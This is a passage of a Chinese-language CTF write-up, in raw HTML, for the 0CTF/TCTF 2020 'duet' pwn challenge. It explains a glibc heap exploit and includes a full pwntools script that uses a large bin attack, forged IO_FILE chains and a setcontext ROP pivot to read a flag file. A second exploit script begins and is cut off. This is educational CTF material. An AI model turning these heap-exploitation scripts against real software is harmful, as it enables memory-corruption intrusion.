class="string">&#x27;__malloc_hook&#x27;</span>]))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x400</span>)  <span class="comment"># add 0x410 chunk, 0x400 chunk to large bin</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.recv(<span class="number">0x110</span>)</span><br><span class="line">heap_address = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">log.success(<span class="string">&quot;heap address &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_address)))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将<code>0x180</code>的堆块伪造成一个<code>0x400</code>大小的堆块，这里需要注意的是，申请一个足够大小的<code>chunk</code>，一个功能是做<code>padding</code>防止<code>0x400 chunk</code>与<code>top chunk</code>合并，另一个功能就是伪造<code>0x400 chunk</code>的相邻<code>chunk</code>，绕过<code>free</code>的合并检查。同时改写<code>0x310 chunk</code>的<code>tcache fd</code>为<code>_malloc_hook</code>的地址，只要分配两次就可以分配到<code>_malloc_hook</code>的位置，为之后的覆写做准备。利用<code>large bin</code>此时也能泄露堆地址。</p><p>此时<code>0x400 chunk</code>已经在<code>large bin</code>中，接着利用<code>0x1f0</code>的<code>overlap</code>堆块修改<code>0X400 largebin chunk</code>的<code>bk_nextsize</code>指针，再次释放一个大小大于<code>0x400</code>的<code>large bin</code>的时候就会在<code>bk_nextsize+0x20</code>的位置写入一个堆地址。这样我们就改写了<code>stderr_chain</code>指向我们控制的内存区域</p><p>接下来就是伪造<code>IO_FILE</code>链表了。因为<code>__malloc_hook</code>所在的<code>tcache</code>为<code>0x310</code>大小，因此控制在<code>Io_str_overflow</code>中的<code>new_size</code>的大小为<code>0x310</code>。最终伪造的<code>IO_FILE</code>链表如下所示。</p><p>最终成功执行<code>ropchain</code>。</p><blockquote><p>在执行setcontext的时候只要控制好rdx+0xxx位置的内存值即可</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./duet_bac&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([<span class="string">&quot;./duet&quot;</span>])</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line">    io_str_jumps = libc.sym[<span class="string">&#x27;_IO_str_jumps&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process([<span class="string">&quot;./duet&quot;</span>])</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line">    io_str_jumps = <span class="number">0x1e6620</span></span><br><span class="line"></span><br><span class="line">ins = [<span class="string">&quot;琴&quot;</span>, <span class="string">&quot;瑟&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size, content=<span class="string">b&quot;a&quot;</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;: &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Instrument: &quot;</span>, ins[index])</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Duration: &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Score: &quot;</span>, content.ljust(size, <span class="string">b&quot;\\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;: &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Instrument: &quot;</span>, ins[index])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;: &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Instrument: &quot;</span>, ins[index])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;: &quot;</span>, <span class="string">&quot;5&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;合: &quot;</span>, <span class="built_in">str</span>(content))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shut</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;: &quot;</span>, <span class="string">&quot;6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0x88</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0x1e0</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0x108</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0x3f8</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0x400</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0xf8</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0x178</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p, &quot;b *0x555555555BC7&quot;)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x88</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0xf0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0xf1</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x178</span>, <span class="string">b&quot;\\x00&quot;</span>*<span class="number">0xe8</span> + p64(<span class="number">0x91</span>))</span><br><span class="line">delete(<span class="number">1</span>)  <span class="comment"># 0x1f0 chunk , +0x100 is 0x180 chunk</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x108</span>, <span class="string">b&quot;\\x00&quot;</span> * <span class="number">0xf8</span> + p64(<span class="number">0x91</span>))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.recv(<span class="number">0x10</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\\x00&quot;</span>)) - <span class="number">96</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x10</span></span><br><span class="line">log.success(<span class="string">&quot;libc address &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x308</span>, <span class="string">b&quot;\\x00&quot;</span> * (<span class="number">0x278</span>) + p64(<span class="number">0x310</span> - <span class="number">0x280</span> + <span class="number">1</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x1e8</span>, <span class="string">b&quot;\\x00&quot;</span> * <span class="number">0xf8</span> + p64(<span class="number">0x401</span>) + p64(libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] + <span class="number">0x10</span> + <span class="number">96</span>) * <span class="number">2</span> + p64(<span class="number">0</span>) * <span class="number">27</span>)</span><br><span class="line">delete(<span class="number">0</span>)  <span class="comment"># 0x400 chunk in unsorted bin</span></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x3f8</span>, (<span class="string">b&quot;\\x00&quot;</span> * <span class="number">0xe8</span> + p64(<span class="number">0x91</span>)).ljust(<span class="number">0x178</span>, <span class="string">b&quot;\\x00&quot;</span>) + p64(<span class="number">0x311</span>) + p64(libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x400</span>)  <span class="comment"># add 0x410 chunk, 0x400 chunk to large bin</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.recv(<span class="number">0x110</span>)</span><br><span class="line">heap_address = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">log.success(<span class="string">&quot;heap address &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_address)))</span><br><span class="line"></span><br><span class="line">p_rdi_r = <span class="number">0x0000000000026542</span> + libc.address</span><br><span class="line">p_rdx_r = <span class="number">0x000000000012bda6</span> + libc.address</span><br><span class="line">p_rax_r = <span class="number">0x0000000000047cf8</span> + libc.address</span><br><span class="line">p_rsi_r = <span class="number">0x0000000000026f9e</span> + libc.address</span><br><span class="line">p_rsp_r = <span class="number">0x0000000000030e4e</span> + libc.address</span><br><span class="line">syscall_address = <span class="number">0x00000000000cf6c5</span> + libc.address</span><br><span class="line">p_rbx_rbp_j_rcx_r = <span class="number">0x1456f4</span> + libc.address</span><br><span class="line"></span><br><span class="line">stderr_chain = libc.sym[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>] + <span class="number">0x68</span></span><br><span class="line">io_list_all = libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line"></span><br><span class="line">fake_io_file_1_address = heap_address + <span class="number">0x490</span></span><br><span class="line">fake_io_file_1_buf_base = heap_address + <span class="number">0x5b0</span> <span class="comment"># old_buf</span></span><br><span class="line">fake_io_file_1_buf_end = heap_address + <span class="number">0x5b0</span> + <span class="built_in">int</span>((<span class="number">0x300</span>-<span class="number">100</span>)/<span class="number">2</span>)</span><br><span class="line">fake_io_file_2_address = heap_address + <span class="number">0x8b0</span></span><br><span class="line">flag_str_address = heap_address + <span class="number">0x5f0</span></span><br><span class="line">flag_address = heap_address + <span class="number">0xa60</span></span><br><span class="line">fake_wide_data_address = heap_address + <span class="number">0x570</span></span><br><span class="line">fake_wide_data_buf_base = <span class="number">1</span></span><br><span class="line">fake_io_file__mode = <span class="number">1</span></span><br><span class="line">orw_address = flag_str_address + <span class="number">0x8</span></span><br><span class="line"></span><br><span class="line">orw = flat([</span><br><span class="line">    p_rdi_r, flag_str_address,</span><br><span class="line">    p_rsi_r, <span class="number">0</span>,</span><br><span class="line">    p_rax_r, <span class="number">2</span>,</span><br><span class="line">    syscall_address,</span><br><span class="line">    p_rdi_r, <span class="number">3</span>,</span><br><span class="line">    p_rsi_r, flag_address,</span><br><span class="line">    p_rdx_r, <span class="number">0x30</span>,</span><br><span class="line">    libc.sym[<span class="string">&#x27;read&#x27;</span>],</span><br><span class="line">    p_rdi_r, <span class="number">1</span>,</span><br><span class="line">    p_rsi_r, flag_address,</span><br><span class="line">    p_rdx_r, <span class="number">0x30</span>,</span><br><span class="line">    libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">io_str_jumps += libc.address</span><br><span class="line">log.success(<span class="string">&quot;io str jumps address &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(io_str_jumps)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 伪造的fake io_file_1</span></span><br><span class="line">payload1 = p64(<span class="number">0</span>)*<span class="number">5</span> + p64(fake_io_file_1_buf_base) + p64(fake_io_file_1_buf_end)</span><br><span class="line">payload1 += p64(<span class="number">0</span>)*<span class="number">4</span> + p64(fake_io_file_2_address) + p64(<span class="number">0</span>)*<span class="number">6</span> + p64(fake_wide_data_address)</span><br><span class="line">payload1 + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(fake_io_file__mode)</span><br><span class="line">payload1 = payload1.ljust((<span class="number">0xd8</span>-<span class="number">0x10</span>), <span class="string">b&quot;\\x00&quot;</span>) + p64(io_str_jumps)</span><br><span class="line">payload1 += p64(<span class="number">0</span>)*<span class="number">4</span> + p64(fake_wide_data_buf_base)</span><br><span class="line"><span class="comment"># fake chunk bypass free(old_buf)</span></span><br><span class="line">payload1 += p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">payload1 += <span class="string">b&quot;./flag\\x00&quot;</span>.ljust(<span class="number">8</span>, <span class="string">b&quot;\\x00&quot;</span>)</span><br><span class="line">payload1 += orw</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x400</span>, payload1)  <span class="comment"># fake io</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># change unsorted bin fd and bk</span></span><br><span class="line">payload = <span class="string">b&quot;\\x00&quot;</span>*<span class="number">0xf8</span> + p64(<span class="number">0x401</span>) + p64(libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] + <span class="number">0x10</span> + <span class="number">1104</span>) * <span class="number">2</span> \\</span><br><span class="line">          + p64(heap_address) + p64(stderr_chain - <span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x1e8</span>, payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">fake_io_file_2_write_ptr = heap_address + <span class="number">0xbc0</span></span><br><span class="line">fake_io_file_2_buf_base = heap_address + <span class="number">0x9d0</span> <span class="comment"># old buf, memcopy start</span></span><br><span class="line">fake_io_file_2_buf_end = heap_address + <span class="number">0x9d0</span> + <span class="built_in">int</span>((<span class="number">0x300</span>-<span class="number">100</span>)/<span class="number">2</span>)</span><br><span class="line">fake_io_file_3_address = heap_address + <span class="number">0xa60</span></span><br><span class="line"></span><br><span class="line">payload2 = p64(<span class="number">0</span>)*<span class="number">5</span> + p64(fake_io_file_2_write_ptr) + p64(<span class="number">0</span>)</span><br><span class="line">payload2 += p64(fake_io_file_2_buf_base) + p64(fake_io_file_2_buf_end)</span><br><span class="line">payload2 += p64(<span class="number">0</span>)*<span class="number">4</span> + p64(fake_io_file_3_address)+ p64(<span class="number">0</span>)*<span class="number">6</span> + p64(fake_wide_data_address)</span><br><span class="line">payload2 += p64(<span class="number">0</span>)*<span class="number">3</span> + p64(fake_io_file__mode)</span><br><span class="line">payload2 = payload2.ljust(<span class="number">0xd8</span>, <span class="string">b&quot;\\x00&quot;</span>) + p64(io_str_jumps)</span><br><span class="line">payload2 += p64(<span class="number">0</span>)*<span class="number">7</span> + p64(<span class="number">0x21</span>) <span class="comment"># fake chunk, bypass free(old_buf) &lt;&lt; old_buf start</span></span><br><span class="line">payload2 += p64(libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">53</span>) <span class="comment"># &lt;&lt; memcopy start, overwrite __malloc_hook</span></span><br><span class="line">payload2 += p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">payload2 = payload2.ljust(fake_io_file_3_address - fake_io_file_2_address, <span class="string">b&quot;\\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rip = p_rdi_r</span><br><span class="line">frame.rsp = orw_address - <span class="number">0x8</span></span><br><span class="line">frame_address = fake_io_file_3_address + <span class="number">0xe0</span></span><br><span class="line">fake_io_file_2_write_ptr = frame_address</span><br><span class="line">fake_io_file_3_buf_base = fake_io_file_2_buf_base</span><br><span class="line">fake_io_file_3_buf_end = fake_io_file_2_buf_end</span><br><span class="line"></span><br><span class="line">fake_io_file_3 = p64(<span class="number">0</span>)*<span class="number">5</span> + p64(fake_io_file_2_write_ptr) + p64(<span class="number">0</span>)</span><br><span class="line">fake_io_file_3 += p64(fake_io_file_3_buf_base) + p64(fake_io_file_3_buf_end)</span><br><span class="line">fake_io_file_3 += p64(<span class="number">0</span>)*<span class="number">4</span> + p64(fake_io_file_3_address)+ p64(<span class="number">0</span>)*<span class="number">6</span> + p64(fake_wide_data_address)</span><br><span class="line">fake_io_file_3 += p64(<span class="number">0</span>)*<span class="number">3</span> + p64(fake_io_file__mode)</span><br><span class="line">fake_io_file_3 = fake_io_file_3.ljust(<span class="number">0xd8</span>, <span class="string">b&quot;\\x00&quot;</span>) + p64(io_str_jumps)</span><br><span class="line"></span><br><span class="line">payload2 += fake_io_file_3</span><br><span class="line">payload2 += <span class="built_in">bytes</span>(frame)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x400</span>, payload2)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x158</span>)</span><br><span class="line">gdb.attach(p, <span class="string">&quot;b *0x555555555BC7&quot;</span>)</span><br><span class="line">shut()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="EXP2"><a href="#EXP2" class="headerlink" title="EXP2"></a>EXP2</h3><p><a href="https://www.anquanke.com/post/id/210160"></a></p><p>除了覆盖<code>stderr</code>之外，还可以直接覆盖<code>global_max_fast</code>，利用<code>fastbin attack</code>。大佬们的<code>WP</code>中出现了两种思路，</p><ul><li><p>一种是直接利用<code>fastbin attack</code>将内存分配到<code>main_arena</code>区域，由于<code>free_hook-0xb68</code>的位置存在一个<code>0x100</code>，可以作为<code>size</code>，因此可以将内存分配到此位置，并伪造<code>top chunk</code>，经过三次分配<code>0x410</code>大小的堆块，就可以将内存分配到<code>free_hook</code>位置处。</p><blockquote><p>但是在伪造top chunk的时候需要注意绕过检查*(main_arena+0x78) == main_arena+0x60<br>size &gt; av-&gt;system_mem // 0x21000, 不然会触发fast bin合并</p></blockquote><p>但是只能进行<code>orw</code>，也就是需要调用<code>setcontext+53</code>进一步控制执行流，也就是我们需要控制<code>rdx</code>的值。此时如果我们释放堆块，那么<code>rdi</code>的值就是堆块的起始地址。下面就是寻找如何通过<code>rdi</code>控制<code>rdx</code>。</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/2020%200CTF%20TCTF%20quals%20%E9%83%A8%E5%88%86PWN%20WriteUp/Untitled%204.png" alt="2020%200CTF%20TCTF%20quals%20%E9%83%A8%E5%88%86PWN%20WriteUp%20b6f5a2be70dd429dbfc595d0e170347f/Untitled%204.png"></p><p>注意到<code>IO_wfile_sync</code>这个函数，其中可以通过<code>rdi</code>控制<code>rbx,rax,rdx,rsi,r12</code>，并且最终会调用<code>[r12+0x20]</code>，如果我们将<code>r12+0x20</code>存储的位置改写为<code>setcontext+53</code>，而又可以通过<code>rdi</code>控制<code>rdx</code>就可以继续劫持控制流进行栈迁移，最终执行<code>ropchain</code>。</p><p>这里用的是<code>tcache stashing unlink</code>覆写<code>global_max_fast</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./duet&quot;</span></span><br><span class="line">context.arch = <span 